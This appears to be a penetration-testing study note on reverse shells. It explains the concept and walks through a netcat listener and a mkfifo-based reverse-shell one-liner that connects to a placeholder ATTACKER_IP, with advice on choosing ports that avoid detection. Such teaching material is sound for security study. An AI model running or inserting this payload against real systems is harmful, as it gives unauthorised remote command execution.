   
# 🌐 Reverse Shell
[Pentest Monkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
## 📋 Purpose

A **reverse shell** (or "connect back shell") initiates a connection from the compromised target to the attacker’s machine, bypassing firewalls and security appliances by blending with legitimate traffic.

## 🔍 How It Works

1. **Listener Setup**: The attacker sets up a listener on their machine.
2. **Payload Execution**: The target runs a payload exploiting a vulnerability or unauthorized access.
3. **Connection**: The target connects to the attacker, exposing a shell.

## 🚀 Example with Netcat

### Set Up Listener

```bash
nc -lvnp 443  # Listens on port 443
```

- `-l`: Listen mode.
- `-v`: Verbose output.
- `-n`: No DNS resolution.
- `-p`: Specifies port (e.g., 443, 80, or 8080 to blend with traffic).

### Execute Payload (Pipe Reverse Shell)

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f
```

- **Breakdown**:
    - `rm -f /tmp/f`: Removes existing pipe.
    - `mkfifo /tmp/f`: Creates a named pipe for two-way communication.
    - `cat /tmp/f | sh -i 2>&1`: Reads pipe, starts interactive shell, redirects errors.
    - `nc ATTACKER_IP 443`: Connects to attacker’s IP and port.
    - `>/tmp/f`: Sends output back to the pipe.

### Attacker Receives Shell

```bash
nc -lvnp 443
# Output: connect to [ATTACKER_IP] from [TARGET_IP] 59964
target@tryhackme:~$
```

## 🛠 Resources

- [Pentest Monkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

## ✅ Quick Notes

- **Reverse Shell**: Allows remote command execution after the target connects back to the attacker.
- **Netcat**: Commonly used to set up listeners for reverse shells.
- **Port Strategy**: Use common ports (e.g., 443, 80) to avoid detection.
- **Detection**: Harder to detect due to outbound connections mimicking legitimate traffic.


